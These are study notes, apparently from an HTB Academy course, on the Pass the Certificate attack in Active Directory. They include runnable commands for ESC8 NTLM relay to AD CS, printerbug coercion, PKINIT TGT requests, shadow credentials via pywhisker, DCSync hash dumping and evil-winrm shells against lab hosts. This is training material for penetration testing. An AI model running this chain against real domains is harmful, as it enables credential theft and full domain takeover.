# Pass the Certificate (PtC)

## What is Pass the Certificate?

**Pass the Certificate (PtC)** is a Kerberos authentication attack where an attacker **uses an X.509 certificate instead of a password or NTLM hash to obtain a Ticket Granting Ticket (TGT).**

Instead of authenticating with:

- Password
    
- NTLM Hash
    
- AES Key
    

the attacker authenticates using a **certificate**.

---

# Visual Overview

```text
            PASSWORD LOGIN

User
 │
 ▼
Password
 │
 ▼
Kerberos
 │
 ▼
TGT
```

---

```text
        PASS THE CERTIFICATE

Certificate (.pfx)
        │
        ▼
PKINIT
        │
        ▼
Kerberos
        │
        ▼
TGT
        │
        ▼
Pass the Ticket
```

---

# What is PKINIT?

PKINIT stands for

> **Public Key Cryptography for Initial Authentication in Kerberos**

It is an extension of the Kerberos protocol that allows authentication using **public/private key cryptography** instead of passwords.

---

## Normally Kerberos Uses

```text
Password

↓

Hash

↓

TGT
```

---

## PKINIT Uses

```text
Certificate

↓

Private Key

↓

TGT
```

---

# Why PKINIT Exists

PKINIT is commonly used for:

- Smart Cards
    
- Certificate Logons
    
- Enterprise PKI
    
- Active Directory Certificate Services (AD CS)
    

---

# Active Directory Certificate Services (AD CS)

AD CS is Microsoft's Public Key Infrastructure (PKI).

It issues digital certificates for:

- Users
    
- Computers
    
- Services
    
- Domain Controllers
    

---

Diagram

```text
           Active Directory

                  │
                  ▼

        Certificate Authority

                  │

        Issues Certificates

     ┌─────────┬─────────┬─────────┐

    User      Server    Computer
```

---

# Pass the Certificate Attack Flow

```text
Obtain Certificate

↓

Use PKINIT

↓

Request TGT

↓

Receive TGT

↓

Pass the Ticket

↓

Access Domain Resources
```

---

# AD CS NTLM Relay Attack (ESC8)

One common way to obtain a certificate is **ESC8**.

ESC8 is an **NTLM Relay attack** against an AD CS Web Enrollment endpoint.

---

# AD CS Web Enrollment

By default the Certificate Authority exposes:

```text
/CertSrv
```

Example:

```text
http://CA/CertSrv
```

This web application allows certificate enrollment.

---

Diagram

```text
Victim

 │ NTLM Authentication

 ▼

Attacker

 │ Relays NTLM

 ▼

AD CS Web Enrollment

 │

 ▼

Certificate Issued
```

---

# Step 1 — Start ntlmrelayx

Tool:

```text
impacket-ntlmrelayx
```

Command

```bash
impacket-ntlmrelayx \
-t http://10.129.234.110/certsrv/certfnsh.asp \
--adcs \
-smb2support \
--template KerberosAuthentication
```

Purpose

- Listen for NTLM authentication
    
- Relay authentication to AD CS
    
- Request certificate
    

---

## Important Parameter

```text
--template
```

The template determines

which certificate type is requested.

Example

```text
KerberosAuthentication
```

The source notes that this value can differ between environments and can be enumerated with tools like **certipy**.

---

# Step 2 — Force Authentication

Instead of waiting,

we can force authentication.

Example:

Printer Bug

Tool

```text
printerbug.py
```

Command

```bash
python3 printerbug.py \
DOMAIN/user:password@DC \
AttackerIP
```

Purpose

Force

```text
Domain Controller

↓

Authenticate

↓

Attacker
```

---

# Step 3 — Relay NTLM

Once authentication arrives,

ntlmrelayx forwards it.

Output

```text
Authenticating...

↓

Generating CSR

↓

Getting Certificate

↓

Certificate Written

↓

DC01$.pfx
```

---

Diagram

```text
DC01$

↓

NTLM

↓

Attacker

↓

Relay

↓

AD CS

↓

Certificate

↓

DC01$.pfx
```

---

# What is a PFX File?

A

```text
.pfx
```

contains

✔ Certificate

✔ Private Key

This file is enough for PKINIT authentication.

---

# Obtain TGT Using PKINIT

Tool

```text
gettgtpkinit.py
```

Repository

```text
PKINITtools
```

---

Installation

```bash
git clone PKINITtools

python3 -m venv .venv

source .venv/bin/activate

pip install -r requirements.txt
```

---

## Common Error

Error

```text
Error detecting libcrypto
```

Fix

```bash
pip install \
git+https://github.com/wbond/oscrypto.git
```

---

# Request a TGT

Command

```bash
python3 gettgtpkinit.py \
-cert-pfx DC01$.pfx \
-dc-ip 10.129.234.109 \
'inlanefreight.local/dc01$' \
/tmp/dc.ccache
```

Output

```text
Loading Certificate

↓

Requesting TGT

↓

Saved TGT

↓

AS-REP Key
```

---

Diagram

```text
Certificate

↓

PKINIT

↓

KDC

↓

TGT

↓

dc.ccache
```

---

# Important Output

The tool prints:

```text
AS-REP Encryption Key
```

Save this value.

The HTB material notes that you **might need it later**.

---

# ccache File

The generated ticket is stored as

```text
dc.ccache
```

This is a Kerberos credential cache.

---

# Using the TGT

Export

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Now every Kerberos-aware tool uses

that ticket automatically.

---

Diagram

```text
ccache

↓

Environment Variable

↓

Kerberos Tools

↓

Authenticated
```

---

# DCSync

Since we authenticated as

```text
DC01$
```

we can perform

```text
DCSync
```

Command

```bash
impacket-secretsdump \
-k \
-no-pass \
-just-dc-user Administrator
```

Purpose

Retrieve

- NTLM Hashes
    
- Domain Secrets
    

---

Diagram

```text
Certificate

↓

TGT

↓

DC Machine Account

↓

DCSync

↓

Administrator Hash
```

---

# Shadow Credentials

Another Pass the Certificate technique.

Instead of relaying,

we abuse

```text
msDS-KeyCredentialLink
```

attribute.

---

# What is msDS-KeyCredentialLink?

Stores

```text
Public Keys
```

used for PKINIT authentication.

If we can modify it,

we can authenticate as

the victim.

---

Diagram

```text
Victim User

↓

msDS-KeyCredentialLink

↓

Public Key

↓

Certificate Login
```

---

# BloodHound

BloodHound shows this permission as

```text
AddKeyCredentialLink
```

Meaning

```text
User A

↓

Can modify

↓

User B

↓

Shadow Credentials
```

---

# Tool

```text
pywhisker
```

---

Command

```bash
pywhisker

--target user

--action add
```

Purpose

✔ Generate Certificate

✔ Generate KeyCredential

✔ Add Public Key

✔ Create PFX

---

Output

```text
Certificate Generated

↓

KeyCredential Generated

↓

PFX Created

↓

Password Printed
```

---

# Files Created

Example

```text
eFUVVTPf.pfx
```

Password

```text
Random Password
```

Store both.

---

Diagram

```text
pywhisker

↓

Certificate

↓

PFX

↓

Password
```

---

# Obtain TGT

Again use

```text
gettgtpkinit.py
```

Command

```bash
python3 gettgtpkinit.py

-cert-pfx victim.pfx

-pfx-pass PASSWORD
```

Result

```text
Victim TGT
```

---

# Verify Ticket

Command

```bash
klist
```

Displays

```text
Default Principal

↓

krbtgt

↓

Expiration
```

---

Diagram

```text
ccache

↓

klist

↓

Valid Ticket
```

---

# Lateral Movement

The HTB scenario notes that the victim belongs to the **Remote Management Users** group, allowing **WinRM** access.

Tool

```text
Evil-WinRM
```

Command

```bash
evil-winrm \
-i dc01 \
-r domain.local
```

Result

```text
whoami

↓

Domain\User
```

---

Diagram

```text
Certificate

↓

TGT

↓

Kerberos

↓

WinRM

↓

Remote Shell
```

---

# No PKINIT?

Sometimes

you possess a certificate

but PKINIT cannot be used.

Reasons include

- Unsupported EKU
    
- KDC restrictions
    
- Certificate limitations
    

---

Solution

Tool

```text
PassTheCert
```

Instead of requesting a TGT,

authenticate directly to

```text
LDAPS
```

Possible actions include

- Password Changes
    
- Grant DCSync Rights
    

(The HTB material mentions this as additional reading and does not cover the full attack.)

---

# Attack Comparison

|Attack|Uses|
|---|---|
|Pass the Hash|NTLM Hash|
|Pass the Key|AES / RC4 Key|
|Pass the Ticket|Kerberos Ticket|
|Pass the Certificate|X.509 Certificate|

---

# Complete Attack Chain

```text
ESC8

↓

NTLM Relay

↓

Certificate

↓

PFX

↓

PKINIT

↓

TGT

↓

ccache

↓

Pass the Ticket

↓

WinRM

↓

DCSync

↓

Domain Administrator Hash
```

---

# Important Commands

### Start Relay

```bash
impacket-ntlmrelayx
```

---

### Force Authentication

```bash
printerbug.py
```

---

### Install PKINITtools

```bash
git clone PKINITtools
```

---

### Fix libcrypto

```bash
pip install oscrypto
```

---

### Request TGT

```bash
gettgtpkinit.py
```

---

### Set Kerberos Ticket

```bash
export KRB5CCNAME
```

---

### View Ticket

```bash
klist
```

---

### Dump Hashes

```bash
impacket-secretsdump
```

---

### Shadow Credentials

```bash
pywhisker
```

---

### Remote Shell

```bash
evil-winrm
```

---

# Memory Tricks

### PKINIT

Think

```text
Public Key Login
```

---

### PFX

Contains

```text
Certificate

+

Private Key
```

---

### ESC8

Think

```text
NTLM Relay

↓

Certificate
```

---

### Shadow Credentials

Think

```text
Modify

↓

msDS-KeyCredentialLink

↓

Become Victim
```

---

### ccache

Think

```text
Linux Version

of

Kerberos Ticket Cache
```

---

# HTB Exam Tips

✅ PKINIT uses **public key cryptography** for Kerberos pre-authentication.

✅ **Pass the Certificate** obtains a **TGT using an X.509 certificate**.

✅ **ESC8** is an **NTLM Relay attack** against **AD CS Web Enrollment**.

✅ `ntlmrelayx` can relay NTLM authentication and request a certificate.

✅ `gettgtpkinit.py` requests a **TGT** using a **PFX certificate**.

✅ Export the ticket with:

```bash
export KRB5CCNAME=/tmp/file.ccache
```

✅ Verify tickets using:

```bash
klist
```

✅ **Shadow Credentials** abuse the **msDS-KeyCredentialLink** attribute.

✅ **pywhisker** adds a new key credential and creates a **PFX** for the victim.

✅ The resulting Kerberos ticket can then be used with tools such as **Evil-WinRM** or **Impacket** for lateral movement, as demonstrated in the HTB material.

---

# 🚀 1-Minute Revision Sheet

```text
Pass the Certificate

↓

PKINIT

↓

Certificate (.pfx)

↓

gettgtpkinit.py

↓

TGT

↓

ccache

↓

export KRB5CCNAME

↓

klist

↓

Pass the Ticket

↓

WinRM / DCSync


ESC8
↓

NTLM Relay
↓

AD CS
↓

Certificate


Shadow Credentials
↓

msDS-KeyCredentialLink
↓

pywhisker
↓

Certificate
↓

TGT
```

These notes are grounded in the content of your uploaded HTB Academy material and preserve the key commands, tools, and workflow presented in the source.